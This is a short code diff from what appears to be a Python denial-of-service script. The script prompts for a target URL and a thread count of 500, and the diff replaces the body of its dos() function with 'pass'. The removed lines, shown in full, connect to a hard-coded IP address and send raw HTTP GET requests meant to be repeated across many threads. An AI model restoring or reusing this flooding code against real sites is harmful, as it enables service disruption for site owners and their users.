@@ -19,11 +19,7 @@ url = input('url :')
 thread = int(input('thread(default 500) :'))
 
 def dos():
-    s.connect(('145.14.145.147', 443))
-    req = 'GET / HTTP/1.1\r\nHost:'+url+'\r\n\r\n'
-    s.send(req.encode())
-    s.recv(10000)
-    print('sending')
+    pass
 
 def att():
     while True:
